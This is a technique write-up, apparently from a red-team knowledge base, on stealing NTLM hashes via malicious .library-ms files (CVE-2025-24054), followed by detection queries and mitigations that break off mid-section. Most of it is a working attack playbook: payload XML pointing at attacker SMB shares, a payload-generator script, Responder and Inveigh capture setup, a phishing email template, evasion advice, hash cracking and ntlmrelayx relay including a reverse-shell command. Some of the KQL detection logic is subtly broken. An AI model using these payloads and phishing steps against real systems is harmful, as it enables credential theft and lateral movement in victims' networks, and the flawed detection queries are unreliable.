# [CA-FORCE-002]: .library-ms NTLM Hash Leakage

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | CA-FORCE-002 |
| **MITRE ATT&CK v18.1** | [T1187 - Forced Authentication](https://attack.mitre.org/techniques/T1187/) |
| **Tactic** | Credential Access |
| **Platforms** | Windows AD (All versions 2016-2025) |
| **Severity** | High |
| **CVE** | CVE-2025-24054 (CVSS 6.5 Medium) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-08 |
| **Affected Versions** | Windows Server 2008 R2+, Windows Server 2012+, Windows Server 2016 (Build 14393.0+), Windows Server 2019 (Build 17763.0+), Windows Server 2022 (Build 20348.0+), Windows 10 (Build 10240.0+), Windows 11 (22H2) |
| **Patched In** | March 11, 2025 (KB5036427 and related patches) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

**Note:** Sections 6 (Atomic Red Team), 8 (Splunk Detection Rules), and 11 (Sysmon Detection) not included because: (1) No Atomic Red Team test exists for this specific CVE, (2) Splunk-specific rules are not provided in primary sources, (3) Sysmon captures network events passively but detection logic relies on Windows Event Log analysis.

---

## 2. EXECUTIVE SUMMARY

**Concept:** CVE-2025-24054 is a Windows NTLM hash disclosure vulnerability that exploits the automatic processing of `.library-ms` files (XML-based library descriptor files) by Windows Explorer. When a user interacts with a malicious `.library-ms` file—whether extracted from a ZIP archive, viewed in folder explorer, or even right-clicked—Windows Explorer automatically initiates an SMB authentication request to an attacker-controlled server specified within the XML. This forced authentication triggers the leakage of the current user's NTLMv2-SSP hash without requiring the user to enter credentials or take any interactive action beyond minimal file interaction.

**Attack Surface:** The vulnerability specifically targets Windows Explorer's automatic library file processing during ZIP extraction and folder enumeration. The malicious `.library-ms` file contains XML with a `<simpleLocation><url>` field pointing to an attacker-controlled UNC path (e.g., `\\attacker.ip\share`). Upon processing, Explorer initiates SMB negotiation and sends NTLM authentication credentials.

**Business Impact:** Captured NTLMv2 hashes can be subjected to offline brute-force cracking (hashcat, John the Ripper) or used directly in **pass-the-hash** relay attacks to compromise additional domain systems without needing the actual plaintext password. In environments with weak SMB signing enforcement or NTLM relay protections, this leads to **lateral movement, privilege escalation, and potentially domain compromise**. Real-world campaigns (Check Point, March 2025) targeting government and financial institutions have used this to establish initial foothold and escalate privileges within networks.

**Technical Context:** Exploitation typically takes 2-5 seconds after user interaction. Detection is possible via outbound SMB connection attempts (ports 139/445) to unusual destinations and event log analysis. Stealth is moderate—defenders with proper egress filtering and network monitoring can detect exploitation; however, organizations without such controls remain highly vulnerable. The attack chain is simple: create malicious `.library-ms` → package in ZIP → distribute via phishing → wait for extraction → capture hash → crack or relay.

### Operational Risk
- **Execution Risk:** Low - Requires only basic XML knowledge and a web server; no complex exploitation required
- **Stealth:** Medium - Generates network SMB traffic that can be logged; however, noisy environments may miss isolated connections
- **Reversibility:** N/A - Hash compromise cannot be "undone"; however, affected credentials can be reset post-incident

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 5.3 | Ensure 'Audit: Force audit policy subcategory settings (Windows Vista or later) to override audit policy category settings' is set to 'Enabled' |
| **CIS Benchmark** | CIS 2.3.11 | Disable NTLM in domain environments; enforce Kerberos |
| **DISA STIG** | Windows Server 2022 STIG V1R5 | SV-257638-r878606 (Disable NTLM Authentication) |
| **NIST 800-53** | AC-3 Access Enforcement | Proper network segmentation and authentication mechanism enforcement |
| **NIST 800-53** | SC-7 Boundary Protection | Block outbound SMB traffic (TCP 445, 139) to untrusted networks |
| **GDPR** | Art. 32 | Security of processing (encryption, authentication strength) |
| **DORA** | Art. 9 | Protection and Prevention of ICT-related incidents |
| **NIS2** | Art. 21 | Cyber Risk Management Measures (incident response, detection) |
| **ISO 27001** | A.9.2.3 | Management of Privileged Access Rights (monitoring NTLM usage) |
| **ISO 27005** | Risk Scenario | "Unauthorized credential capture via forced authentication" |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:** Any user (standard, domain, or local). No privileges needed for exploitation.

**Required Access:** 
- Network access to victim (SMB ports 139/445 or WebDAV ports 80/443)
- Ability to deliver `.library-ms` file to victim (email, file share, USB, web download)

**Supported Versions:**
- **Windows Server:** 2008 R2 SP1+, 2012+, 2016 (Build 14393.0 through 14393.7876 unpatched), 2019 (Build 17763.0 through 17763.7009 unpatched), 2022 (Build 20348.0 through 20348.3270 unpatched)
- **Windows Client:** Windows 10 (all builds before patch), Windows 11 (22H2)
- **PowerShell:** 5.0+ (for deployment and hash capture tooling)

**Environment Requirements:**
- NTLM enabled on network (not enforced to Kerberos-only)
- No SMB signing or signing not enforced at network/server level
- Minimal or no egress filtering on SMB (TCP 445) outbound traffic

**Tools:**
- [Responder](https://github.com/lgandx/Responder) (Python, for NTLM capture on Linux/Kali)
- [Inveigh](https://github.com/Kevin-Robertson/Inveigh) (PowerShell, for Windows-based capture)
- [Impacket ntlmrelayx](https://github.com/SecureAuthCorp/impacket) (Python, for relay attacks post-capture)
- [Hashcat](https://hashcat.net/) or [John the Ripper](https://www.openwall.com/john/) (for offline hash cracking)
- Standard ZIP utility (or Python `zipfile` module)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### PowerShell Reconnaissance

**Check if NTLM Authentication is Enabled:**
```powershell
# Check if Kerberos-only enforcement is in place
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LmCompatibilityLevel" | Select-Object LmCompatibilityLevel

# Expected output:
# LmCompatibilityLevel = 5 (allows NTLMv2)
# LmCompatibilityLevel = 3 or 4 (VULNERABLE - allows NTLMv1 or older NTLM)
# LmCompatibilityLevel = 6 or higher (may indicate Kerberos enforced, but NTLM may still fallback)
```

**What to Look For:**
- `LmCompatibilityLevel < 5`: System accepts legacy NTLM versions; higher exploitation risk
- `LmCompatibilityLevel = 5`: Accepts NTLMv2 (current standard); system still vulnerable
- Registry key absent: Defaults to level 3 (highly vulnerable)

**Check Outbound SMB Connectivity:**
```powershell
# Test SMB connectivity to attacker server (test with 192.168.1.100 as example)
Test-NetConnection -ComputerName "192.168.1.100" -Port 445

# Expected output for VULNERABLE:
# TcpTestSucceeded : True
# PingSucceeded : True

# For patched systems, SMB signing may block relay, but hash is still captured
```

**Version Note:** All Windows versions 2016-2025 support this query identically.

### Linux / CLI Reconnaissance

**Using Nmap to Confirm SMB is Reachable:**
```bash
# Scan for open SMB port
nmap -p 445 192.168.1.100

# Expected output:
# 445/tcp open  microsoft-ds

# Attempt SMB connection
smbclient -N -L \\192.168.1.100 2>&1 | head -5
```

**Using impacket-smbserver (for testing hash capture):**
```bash
# Start a fake SMB server to capture hashes
impacket-smbserver -smb2support -username dummy -password dummy shared /tmp

# Wait for incoming connections from Windows systems
# Captured hashes will appear in the terminal
```

**What to Look For:**
- Successful SMB connection indicates no egress filtering
- NTLM authentication attempts in server logs = system is vulnerable

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: ZIP Archive Delivery (.library-ms + ZIP)

**Supported Versions:** Windows Server 2016-2025, Windows 10/11 (all versions, pre-patch)

This is the most common attack vector observed in real-world campaigns. The `.library-ms` file is embedded within a ZIP archive. Upon extraction by the victim, Windows Explorer automatically processes the file and triggers SMB authentication to the attacker's server.

#### Step 1: Create Malicious .library-ms File

**Objective:** Craft an XML file that instructs Windows Explorer to connect to an attacker-controlled SMB share.

**Command (Linux/Python):**
```bash
cat > malicious.library-ms <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\ATTACKER_IP\shared</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
EOF

# Example with attacker IP 192.168.1.100:
cat > malicious.library-ms <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\192.168.1.100\shared</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
EOF
```

**Expected Output:**
```
$ ls -la malicious.library-ms
-rw-r--r-- 1 attacker attacker 278 Jan  8 10:15 malicious.library-ms
```

**What This Means:**
- File is created in XML format; any text editor can verify contents
- Size is typically 250-350 bytes depending on IP address
- Filename must end in `.library-ms` extension for Windows to process it

**OpSec & Evasion:**
- Store on an encrypted drive or in-memory to avoid forensic recovery
- Use legitimate file-sharing services (Dropbox, OneDrive) to host the ZIP, not direct from attacker IP
- Name the ZIP and `.library-ms` with innocuous names (e.g., `report.zip`, `summary.library-ms`)
- Detection likelihood: Low if delivered via external file-sharing platform; Medium if directly from attacker email

**Troubleshooting:**
- **Error:** File opens in text editor instead of triggering SMB
  - **Cause:** File extension is incorrect or Explorer doesn't recognize it
  - **Fix:** Verify filename ends exactly with `.library-ms` (case-insensitive)
  - **Fix (Server 2022+):** File association may have changed; test on target system first

#### Step 2: Package .library-ms into ZIP Archive

**Objective:** Create a ZIP file containing the malicious `.library-ms` so victims can download and extract it.

**Command (Linux):**
```bash
# Create ZIP with the .library-ms file
zip -q malicious.zip malicious.library-ms

# Verify contents
unzip -l malicious.zip
# Expected output:
# Archive:  malicious.zip
#   Length     Date   Time    Name
# --------- ---------- -----  ----
#       278  2025-01-08 10:15  malicious.library-ms
# --------- ---------- -----  ----
#       278                     1 file
```

**Command (Windows PowerShell):**
```powershell
# Create ZIP using built-in compression
Compress-Archive -Path "C:\temp\malicious.library-ms" -DestinationPath "C:\temp\payload.zip" -Force

# Verify
Get-ChildItem C:\temp\payload.zip
```

**Expected Output:**
```
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         1/8/2025  10:16 AM            456 payload.zip
```

**What This Means:**
- ZIP file is created successfully; size includes compression overhead
- ZIP can be verified with standard tools
- Contents are ready for distribution

**OpSec & Evasion:**
- Use obfuscated filenames that don't raise suspicion (e.g., `Q4_Report.zip`, `Compliance_Check.zip`)
- Host on legitimate file-sharing platforms with trusted URLs
- Avoid hosting from attacker infrastructure directly
- Detection likelihood: Low if legitimate distribution channel used

**Troubleshooting:**
- **Error:** ZIP file is corrupted
  - **Cause:** .library-ms file not written correctly
  - **Fix:** Manually verify .library-ms contents before zipping
  - **Fix (Server 2016-2019):** Use Linux `zip` utility; some Windows compression tools may add extra headers

#### Step 3: Set Up NTLM Hash Capture Server

**Objective:** Start a listening service that captures incoming NTLM authentication attempts from victims.

**Command (Linux/Responder):**
```bash
# Install Responder (if not already installed)
cd /opt
git clone https://github.com/lgandx/Responder.git
cd Responder

# Edit configuration to set NTLM challenge to known value (for cracking)
sed -i 's/ Random/ 1122334455667788/g' Responder.conf

# Start Responder on eth0 interface, analyzing mode (listen only, no spoofing)
python3 Responder.py -I eth0 -A

# Alternative: Full capture mode (captures hashes from forced auth)
python3 Responder.py -I eth0 -wv -rL

# Parameters:
# -I = interface
# -A = Analyze only (no DNS/LLMNR spoofing)
# -w = Enable WPAD spoofing
# -v = Verbose
# -rL = Relay mode
```

**Command (Windows/Inveigh):**
```powershell
# Import Inveigh module
Import-Module .\Inveigh.ps1

# Start Inveigh SMB listener
Invoke-Inveigh -IP 192.168.1.100 -HTTP N -NBNS N -mDNS N -LLMNR N -Challenge 1122334455667788

# Parameters:
# -IP = Listening IP
# -HTTP = Disable HTTP listener
# -NBNS = Disable NetBIOS spoofing
# -mDNS = Disable mDNS spoofing
# -LLMNR = Disable LLMNR spoofing
# -Challenge = Fixed NTLM challenge for offline cracking
```

**Expected Output (Responder):**
```
[*] Responder Started: True
[*] Listening on interface eth0
[SMB] NTLMv2-SSP Hash Captured from: 192.168.1.50 (VICTIM-PC) - User: DOMAIN\Administrator
  Full Hash: Administrator::DOMAIN:1122334455667788:CAPTURED_RESPONSE
```

**Expected Output (Inveigh):**
```
[+] SMB Server Started
[+] Listening on 192.168.1.100:445
[+] NTLMv2-SSP Hash Captured:
DOMAIN\Administrator:1122334455667788:B44F4DDAB0FFC8976...
```

**What This Means:**
- Server is listening for SMB connections on port 445
- NTLM hashes will be captured and displayed in real-time
- Challenge value is set to a known value for offline cracking

**OpSec & Evasion:**
- Run on a server with a legitimate IP (not a VPN or obviously malicious IP)
- Use domain-front or CDN to mask server origin
- Monitor for blue team detection signals (EDR, SIEM alerts)
- Detection likelihood: Medium-High if network monitoring is enabled

**Troubleshooting:**
- **Error:** Port 445 already in use
  - **Cause:** Another SMB service running
  - **Fix (Linux):** `sudo lsof -i :445` to identify service; kill if not needed
  - **Fix (Windows):** Responder/Inveigh typically handles multiple listeners
  
- **Error:** Permission denied on port 445
  - **Cause:** Non-root/admin user trying to bind to privileged port
  - **Fix (Linux):** Run as root: `sudo python3 Responder.py...`
  - **Fix (Windows):** Run PowerShell as Administrator

#### Step 4: Deliver ZIP to Victim (Social Engineering)

**Objective:** Trick victim into downloading and extracting the malicious ZIP file via phishing email or file-sharing link.

**Example Phishing Email:**
```
Subject: Q4 2025 Compliance Audit - Action Required

Body:
Dear [Victim Name],

Please review the attached Q4 compliance report and provide feedback by EOD Friday. 
The file contains important audit results that require your approval.

Best regards,
Compliance Team
```

**Attachment/Link:** 
- Dropbox link to `Q4_Compliance.zip`
- OneDrive shared link to `Audit_Summary.zip`
- Direct email attachment (highest detection risk)

**What to Look For (from attacker perspective):**
- Victim opens/extracts ZIP file
- No further user action required
- SMB authentication happens automatically

**OpSec & Evasion:**
- Use legitimate file-sharing domains to avoid email gateway filtering
- Craft emails with target-specific details (department, project names)
- Impersonate trusted internal senders (use similar domain names)
- Detection likelihood: High if email gateway has advanced scanning (DeepFreeze, etc.)

#### Step 5: Wait for Hash Capture and Crack Offline

**Objective:** Once NTLM hash is captured, crack it offline to obtain plaintext password.

**Command (Hashcat on GPU):**
```bash
# Syntax: hashcat -m 5600 (NTLMv2) <hash_file> <wordlist>
hashcat -m 5600 -a 0 captured_hash.txt /usr/share/wordlists/rockyou.txt

# Parameters:
# -m 5600 = NTLMv2 hash type
# -a 0 = Dictionary attack
# Example hash format:
# Administrator::DOMAIN:1122334455667788:CAPTURED_RESPONSE_HERE
```

**Command (John the Ripper):**
```bash
# Crack using John
john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt captured_hash.txt

# Alternative: Use crack.sh online service for LM/NTLMv1 (much faster for these)
# (Note: NTLMv2 is not vulnerable to crack.sh due to random blob)
```

**Alternative: Use Relay Instead of Cracking:**
```bash
# Instead of cracking, relay the captured hash to SMB target
impacket-ntlmrelayx -t smb://192.168.1.20 -c 'whoami'

# This authenticates to another system on behalf of the captured user
# No password cracking needed
```

**Expected Output (Successful Crack):**
```
Session.Name...: Hashcat
Status...........: Cracked
Hash.Type........: NTLMv2
Hash.Target......: Administrator::DOMAIN:...
Time.Started.....: Wed Jan 08 11:22:33 2025
Time.Estimated...: Wed Jan 08 11:22:45 2025
Recovered........: 1/1 (100.00%)
Administrator: P@ssw0rd123!
```

**What This Means:**
- Password has been successfully recovered
- Can now be used for lateral movement or privilege escalation
- Weak passwords crack in seconds; strong passwords may take hours/days

**OpSec & Evasion:**
- Perform cracking on attacker infrastructure, not on network
- Use wordlists/dictionaries appropriate to target (company names, dates)
- Detection likelihood: Low (offline activity)

**Troubleshooting:**
- **Error:** Hash format not recognized
  - **Cause:** Hash not properly formatted (missing colons, extra spaces)
  - **Fix:** Use `grep` to clean hash format: `echo "DOMAIN\user::DOMAIN:challenge:response" > hash.txt`
  
- **Error:** No GPU available
  - **Cause:** Hashcat detects no GPU
  - **Fix:** Use CPU mode: `hashcat -m 5600 -a 0 --device-type=CPU`

**References & Proofs:**
- [Hashcat Mode 5600 Documentation](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [Check Point Research - CVE-2025-24054 Analysis](https://research.checkpoint.com/2025/cve-2025-24054-ntlm-exploit-in-the-wild/)
- [Responder Tool GitHub](https://github.com/lgandx/Responder)
- [Impacket ntlmrelayx Documentation](https://github.com/SecureAuthCorp/impacket/wiki/ntlmrelayx)

---

### METHOD 2: Direct File Delivery (No ZIP Compression)

**Supported Versions:** Windows Server 2016-2025, Windows 10/11 (verified March 2025 campaigns)

More recent phishing campaigns deliver the `.library-ms` file directly without ZIP compression. Simply viewing the folder containing the file or right-clicking on it triggers the vulnerability.

#### Step 1: Create Malicious .library-ms File

**Objective:** Same as METHOD 1 Step 1.

**Command:**
```bash
cat > Info.doc.library-ms <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\159.196.128.120\shared</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
EOF
```

**File Naming Trick:** Name it `Info.doc.library-ms` to disguise as a document; Windows will process as `.library-ms`.

**Expected Output:**
```
$ file Info.doc.library-ms
Info.doc.library-ms: XML 1.0 document, ASCII text
```

#### Step 2: Email or Upload to File Share

**Objective:** Send `.library-ms` file directly to victim email or shared network folder.

**Command (Upload to OneDrive/Dropbox):**
```bash
# Using curl to upload
curl -X POST https://content.dropboxapi.com/2/files/upload \
  -H "Authorization: Bearer YOUR_ACCESS_TOKEN" \
  -H "Dropbox-API-Arg: {\"path\": \"/Shared/Info.doc.library-ms\", \"mode\": \"add\"}" \
  --data-binary @Info.doc.library-ms
```

**Email Attachment:**
- Subject: "Document Review Required - Q4 Summary"
- Body: "Please review the attached document and provide feedback."
- Attachment: `Info.doc.library-ms`

**Expected Outcome:**
- Victim downloads/opens folder containing the file
- Windows Explorer enumerates folder, processes `.library-ms`
- NTLM hash is captured automatically (no extraction needed)

#### Step 3: Trigger Hash Capture

**Objective:** Hash is captured when victim takes any of these actions:
- Opens folder containing the `.library-ms` file
- Right-clicks on the `.library-ms` file
- Navigates through folder in Windows Explorer
- Single-clicks to select the file

**No Additional Action Needed:**
- Unlike ZIP method, no "Extract All" needed
- Victim may not even realize the hash was captured

**What This Means:**
- Even lower user friction than ZIP method
- Easier social engineering
- Higher exploitation success rate

**OpSec & Evasion:**
- File appears to be a legitimate document (disguised with `.doc` in name)
- Discovery is passive (folder view = trigger)
- Detection likelihood: Medium (SMB connection will still appear in logs)

#### Step 4: Hash Capture & Cracking

**Objective:** Same as METHOD 1 Step 5.

**References & Proofs:**
- [TheHackerNews - CVE-2025-24054 Analysis](https://thehackernews.com/2025/04/cve-2025-24054-under-active.html)
- [Check Point Malspam Campaign Analysis](https://research.checkpoint.com/2025/cve-2025-24054-ntlm-exploit-in-the-wild/)

---

### METHOD 3: NTLM Relay Attack (Direct Exploitation Without Cracking)

**Supported Versions:** Windows Server 2016-2025, Windows 10/11

Instead of cracking the captured hash offline, relay it directly to SMB services on another system to authenticate as the captured user.

#### Step 1: Set Up Hash Capture Server (Responder)

**Command:**
```bash
python3 Responder.py -I eth0 -wv -rL
```

(Same as METHOD 1 Step 3)

#### Step 2: Deliver Malicious .library-ms File

**Command:**
```bash
# Deliver via email or file share (same as METHOD 1/2)
```

#### Step 3: Relay Captured Hash to Target SMB Service

**Objective:** Use the captured NTLM hash to authenticate to a target server (e.g., file share, admin workstation).

**Command (impacket ntlmrelayx):**
```bash
# Relay to a specific target system
impacket-ntlmrelayx -t smb://192.168.1.20 -c 'whoami'

# Parameters:
# -t = Target (SMB server)
# -c = Command to execute (whoami, ipconfig, etc.)

# Alternative: Create reverse shell
impacket-ntlmrelayx -t smb://192.168.1.20 -c 'powershell -enc <BASE64_SHELLCODE>'
```

**Expected Output:**
```
[*] Incoming connection (192.168.1.50) - SMB Session will be relayed
[+] Authenticating against smb://192.168.1.20
[+] User is admin on 192.168.1.20!
[+] Command executed:
nt authority\system
```

**What This Means:**
- Hash was successfully relayed to target
- Command executed in context of captured user
- No password cracking needed

**OpSec & Evasion:**
- Relay attacks generate logs on target system
- SMB signing can block relay (if enforced)
- Detection likelihood: High if SMB signing enabled; Low otherwise

**Troubleshooting:**
- **Error:** "SMB signing required, relay not possible"
  - **Cause:** Target system has SMB signing enforced
  - **Fix:** Target a different system without signing, or use a signing bypass (if available)

**References & Proofs:**
- [Impacket ntlmrelayx Documentation](https://github.com/SecureAuthCorp/impacket)

---

## 7. TOOLS & COMMANDS REFERENCE

### [Responder](https://github.com/lgandx/Responder)
**Version:** Latest (6.2.x as of 2025)  
**Minimum Version:** 3.x  
**Supported Platforms:** Linux, macOS, Windows (via WSL)

**Installation:**
```bash
git clone https://github.com/lgandx/Responder.git
cd Responder
sudo python3 Responder.py -h
```

**Usage (Capture Mode):**
```bash
sudo python3 Responder.py -I eth0 -wvr
# -I = Interface
# -w = WPAD spoofing
# -v = Verbose
# -r = Raise privileges on relay
```

**Usage (Analyze Mode - Hash Capture Only):**
```bash
python3 Responder.py -I eth0 -A
```

### [Inveigh](https://github.com/Kevin-Robertson/Inveigh)
**Version:** 1.4.x  
**Minimum Version:** 1.0  
**Supported Platforms:** Windows (PowerShell)

**Installation:**
```powershell
# Download Inveigh.ps1
Invoke-WebRequest -Uri https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1 -OutFile Inveigh.ps1

# Import module
. .\Inveigh.ps1
```

**Usage:**
```powershell
Invoke-Inveigh -IP 192.168.1.100 -HTTP N -HTTPS N -Foreground

# Parameters:
# -IP = Listening IP
# -HTTP = Enable HTTP capture
# -HTTPS = Enable HTTPS capture
# -Foreground = Run in foreground (for testing)
```

### [Impacket - ntlmrelayx](https://github.com/SecureAuthCorp/impacket)
**Version:** Latest (0.11.x)  
**Minimum Version:** 0.9.x  
**Supported Platforms:** Linux, Windows (via WSL/Python)

**Installation:**
```bash
pip3 install impacket
```

**Usage (Relay to SMB):**
```bash
impacket-ntlmrelayx -t smb://target.ip -c 'whoami'
```

### Script (One-Liner - Create .library-ms + ZIP)
```python
#!/usr/bin/env python3
import zipfile
import sys

attacker_ip = sys.argv[1] if len(sys.argv) > 1 else "192.168.1.100"

library_ms_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\\\{attacker_ip}\\shared</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>'''

with open("payload.library-ms", "w") as f:
    f.write(library_ms_content)

with zipfile.ZipFile("payload.zip", "w") as z:
    z.write("payload.library-ms")

print(f"[+] Created payload.zip with attacker IP: {attacker_ip}")
```

**Usage:**
```bash
python3 create_payload.py 192.168.1.100
```

---

## 9. MICROSOFT SENTINEL DETECTION

### Query 1: Detect Outbound SMB Connections to Unusual Destinations (Network Events)

**Rule Configuration:**
- **Required Table:** `DeviceNetworkEvents`
- **Required Fields:** `RemotePort`, `RemoteIP`, `DeviceId`, `InitiatingProcessName`
- **Alert Severity:** Medium
- **Frequency:** Real-time (5-minute aggregation)
- **Applies To Versions:** All Windows Server 2016+ with Defender for Endpoint

**KQL Query:**
```kusto
DeviceNetworkEvents
| where RemotePort in (445, 139)
| where InitiatingProcessName == "explorer.exe"
| where RemoteIP !in ("10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16")  // Exclude internal IPs
| where not(RemoteIP startswith "DC-" or RemoteIP startswith "192.168.1.")  // Exclude known DCs
| summarize count() by DeviceId, RemoteIP, RemotePort, bin(TimeGenerated, 5m)
| where count_ > 0
```

**What This Detects:**
- Explorer.exe initiating SMB connections (port 445/139) to external or unusual IPs
- Lack of established SMB sessions prior (one-way connection attempt)
- Multiple devices or repeated attempts from same device

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `Detect Explorer SMB Connections to External IPs`
   - Severity: `Medium`
   - Status: `Enabled`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `30 minutes`
6. **Incident settings Tab:**
   - Enable **Create incidents from all alerts**
   - Alert grouping: Group incidents by Device ID
7. **Automated response:** Configure to disable user account or isolate device
8. Click **Review + create** → **Save**

**Manual Configuration Steps (PowerShell):**
```powershell
Connect-AzAccount
$ResourceGroup = "YourResourceGroup"
$WorkspaceName = "YourSentinelWorkspace"

New-AzSentinelAlertRule -ResourceGroupName $ResourceGroup -WorkspaceName $WorkspaceName `
  -DisplayName "Detect Explorer SMB Connections to External IPs" `
  -Query @"
DeviceNetworkEvents
| where RemotePort in (445, 139)
| where InitiatingProcessName == "explorer.exe"
| where RemoteIP !in ("10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16")
"@ `
  -Severity "Medium" `
  -Enabled $true `
  -RunOncePerDay
```

---

### Query 2: Detect .library-ms File Interaction (File Activity)

**Rule Configuration:**
- **Required Table:** `DeviceFileEvents`
- **Required Fields:** `FileName`, `FolderPath`, `ActionType`, `DeviceId`
- **Alert Severity:** High
- **Frequency:** Real-time
- **Applies To Versions:** All Windows Server 2016+ with Defender for Endpoint

**KQL Query:**
```kusto
DeviceFileEvents
| where FileName endswith ".library-ms"
| where ActionType in ("FileCreated", "FileModified", "FileRenamed")
| where FolderPath !contains "System32"  // Exclude legitimate Windows files
| summarize count() by DeviceName, FileName, FolderPath, TimeGenerated
```

**What This Detects:**
- Creation or modification of `.library-ms` files in user-accessible locations
- Potential malicious `.library-ms` staging
- Suspicious file name combinations (e.g., `Info.doc.library-ms`)

**Manual Configuration Steps:**
1. Go to **Analytics** → **+ Create** → **Scheduled query rule**
2. Name: `Detect Suspicious .library-ms File Creation`
3. Severity: `High`
4. Paste query
5. Run every: `5 minutes`
6. Create incidents: **Yes**
7. Save rule

---

### Query 3: Detect NTLM Authentication from Explorer.exe (Process Injection/Living-off-the-Land)

**Rule Configuration:**
- **Required Table:** `DeviceLogonEvents`, `DeviceProcessEvents`
- **Required Fields:** `AccountName`, `LogonType`, `InitiatingProcessName`
- **Alert Severity:** High
- **Frequency:** Real-time
- **Applies To Versions:** Windows Server 2016-2025

**KQL Query:**
```kusto
DeviceLogonEvents
| where LogonType == 3  // Network logon (SMB)
| where AuthenticationPackageName =~ "NTLM"
| where isnotempty(InitiatingProcessName) and InitiatingProcessName =~ "explorer.exe"
| where AccountName != "ANONYMOUS LOGON"
| summarize count() by DeviceName, AccountName, RemoteIP, TimeGenerated
```

**What This Detects:**
- Explorer initiating NTLM logons (forced authentication)
- Unusual account names being used for logon
- Network logons from desktop/user machines (suspicious)

---

## 10. WINDOWS EVENT LOG MONITORING

### Event ID 4624 (Successful Logon)

**Log Source:** `Security`

**Trigger:** When NTLM authentication is relayed or successful after capture

**Filter:** 
- Event ID 4624
- Logon Type 3 (Network)
- Authentication Package = NTLM*
- Account Name != ANONYMOUS LOGON
- Workstation Name is DIFFERENT from Remote IP (relay attack indicator)

**Manual Configuration Steps (Group Policy):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **System Audit Policies - Local**
3. Enable: **Logon/Logoff** → **Audit Logon**
4. Set to: **Success and Failure**
5. Run `gpupdate /force` on all domain computers

**Manual Configuration Steps (Server 2022+):**
1. Same as above; Group Policy works identically across all Windows Server versions

**Manual Configuration Steps (Local Policy):**
1. Open **Local Security Policy** (secpol.msc)
2. Navigate to **Security Settings** → **Advanced Audit Policy Configuration** → **System Audit Policies**
3. Enable: **Logon/Logoff** → **Audit Logon**
4. Apply: **Success and Failure**
5. Run `auditpol /set /subcategory:"Logon" /success:enable /failure:enable`

### Event ID 4625 (Failed Logon)

**Log Source:** `Security`

**Trigger:** When NTLM relay attempt fails (e.g., wrong password, target unreachable)

**Filter:**
- Event ID 4625
- Logon Type 3
- Failure Reason = "Invalid Username or Password"

**Configuration:** Same as Event ID 4624 above

---

## 14. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Mitigation 1: Apply March 2025 Security Update (KB5036427)**

**Objective:** Patch the vulnerability at the OS level. Microsoft released fixes on March 11, 2025, for all affected Windows versions.

**Applies To Versions:** Server 2016-2025, Windows 10/11

**Manual Steps (Windows Update):**
1. Go to **Settings** → **Update & Security** → **Windows Update**
2. Click **Check for updates**
3. Download and install **"Security Update for Windows (KB5036427)"** or related March 2025 patches
4. Restart when prompted
5. Verify patch installation:
   ```powershell
   Get-HotFix | Select-Object -Property HotFixId, InstalledOn | Where-Object {$_.HotFixId -like "KB5036427"}
   ```

**Manual Steps (PowerShell - Server 2022+):**
```powershell
# Download and install updates
$Updates = Get-WUList | Where-Object {$_.Title -like "*KB5036427*"}
Install-WindowsUpdate -Updates $Updates -AcceptAll -AutoReboot
```

**Manual Steps (WSUS / SCCM):**
1. Deploy KB5036427 to all computers via WSUS or SCCM
2. Set to automatic restart
3. Verify installation across fleet

**Validation Command (Verify Fix):**
```powershell
# Check if patched version is installed
(Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer" -Name "ProductVersion").ProductVersion

# Expected output for patched:
# Windows Server 2022 KB5036427: 10.0.20348.3270+
# Windows Server 2019 KB5036427: 10.0.17763.7009+
# Windows Server 2016 KB5036427: 10.0.14393.7876+
```

**What to Look For:**
- Build version matches or exceeds patched version
- Windows Update shows KB5036427 installed
- No failed updates in Event Viewer

---

**Mitigation 2: Block Outbound SMB Traffic (Network Egress Filtering)**

**Objective:** Prevent systems from connecting to external SMB servers (ports 445, 139). This breaks the attack chain immediately.

